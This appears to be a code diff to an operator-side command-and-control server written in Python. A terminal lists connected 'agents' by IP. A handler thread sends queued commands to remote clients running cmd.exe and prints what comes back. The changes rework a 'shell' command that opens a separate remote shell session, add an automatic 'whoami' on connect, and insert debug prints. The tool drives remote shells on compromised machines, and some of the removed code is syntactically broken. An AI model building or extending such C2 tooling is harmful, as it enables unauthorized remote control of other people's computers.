@@ -36,7 +36,6 @@ def main():
     terminal.cmdloop()
 
 
-
 class Terminal(Cmd):
     def __init__(self,Listeners,ClientDict):
         Cmd.__init__(self)
@@ -48,23 +47,6 @@ class Terminal(Cmd):
         self.agent = ''
         self.prompt = '$ '
 
-    def do_shell(self,args):
-        if self.q == None:
-            print("[-] You need to choose agent.")
-            self.help_interact()
-        else:
-            self.q.put("shell\n")
-            # For now shell is implemented in separate connection in agents
-            # Sleep while shell connection is created
-            time.sleep(3)
-            print("[DBG] Getting new connection queue...")
-            # Parsing last agent ID
-            self.shellagent = list(self.ClientDict.keys())[-1]
-            # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
-            self.q = self.ClientDict[self.agent]][1]
-            print("[DBG] Shell Agent ID: {}".format(self.shellagent)
-            print("[DBG] Agent data: {}".format(self.ClientDict[self.shellagent]))
-            self.prompt('{} >'.format(self.ClientDict[self.shellagent][0][0]))
 
     def do_interact(self,args):
         if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
@@ -78,6 +60,27 @@ class Terminal(Cmd):
                 print("[-] No such agent. Use: 'list agents'")
             except Exception as ex:
                 print("[-] Unhandled exception: {}".format(ex))
+
+
+    def do_shell(self,args):
+        if self.q == None:
+            print("[-] You need to choose agent.")
+            self.help_interact()
+        else:
+            self.q.put("shell\n")
+            # For now shell is implemented in separate connection in agents
+            # Sleep while shell connection is created
+            time.sleep(3)
+            print("[DBG] Getting new connection queue...")
+            # Parsing last agent ID
+            self.shellagent = list(self.ClientDict.keys())[-1]
+
+            # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
+            print("[DBG] Shell Agent ID: {} and data:".format(self.shellagent))
+            print("{}".format(self.ClientDict[self.shellagent]))
+            self.do_interact(self.shellagent)
+            self.prompt = '{} > '.format(self.ClientDict[self.shellagent][0][0])
+            
 
     def do_exit(self,args):
         time.sleep(0.5)
@@ -102,8 +105,8 @@ class Terminal(Cmd):
     def help_start(self):
         # TODO
         print("start <arguments>")
-        print("\tlisener <type>")
-        print("\t\t<tcp>")
+        print("\tlistener <type>")
+        print("\t\ttcp")
 
     def do_list(self,args):
         #print("[DBG] args.split(' '): {}".format(args.split(' ')))
@@ -112,8 +115,8 @@ class Terminal(Cmd):
             self.help_list()
         else:
             if (args.lower() == "agents" or args == "a"):
-                print("Agents:\n")#.format(ClientDict))
-                for i in ClienDict.keys():
+                print("Agents:")#.format(ClientDict))
+                for i in self.ClientDict.keys():
                     print("\tID: {}, IP: {}".format(i,ClientDict[i][0][0]))
             elif (args.lower() == "lhost"):
                 print("lhost: {}".format(self.lhost))
@@ -226,7 +229,7 @@ class BotHandler(threading.Thread):
         
         # Initial message for socket state check on client side.
         # If socket ok, will credate 'cmd.exe' subprocess.
-        # self.client.send("background checks..".encode("utf-8"))
+        self.client.send("whoami\n".encode("utf-8"))
         # Not actual in agent client.
 
         # Getting banner
@@ -247,11 +250,15 @@ class BotHandler(threading.Thread):
 
         # Command loop
         while True:
+            print("[DBG] BotHandler with AgentName {} here 1...".format(AgentName))
             RecvBotCmd = self.q.get()
+            print("[DBG] BotHandler with AgentName {} here 2...".format(AgentName))
             try:
                 self.client.send(RecvBotCmd.encode('utf-8'))
+                print("[DBG] BotHandler with AgentName {} here 3...".format(AgentName))
                 cmd_response = ""
                 while True:
+                    print("[DBG] BotHandler with AgentName {} here 4...".format(AgentName))
                     try:
                         # Client returns entered command (because cmd.exe has it in input)
                         # So 
@@ -263,6 +270,7 @@ class BotHandler(threading.Thread):
                             self.client.settimeout(5)
                         else:
                             self.client.settimeout(0.5)
+                        print("[DBG] BotHandler with AgentName {} here 5...".format(AgentName))
                         recv = self.client.recv(4096).decode('utf-8')
                     except socket.timeout:
                         # if timeout exception is triggered - assume no data anymore
@@ -275,6 +283,7 @@ class BotHandler(threading.Thread):
                         break
                     else:
                         cmd_response += recv
+                    print("[DBG] BotHandler with AgentName {} here 6...".format(AgentName))
                 
                 # Removing sent command from response before printing output
                 print(cmd_response.replace(RecvBotCmd,""))
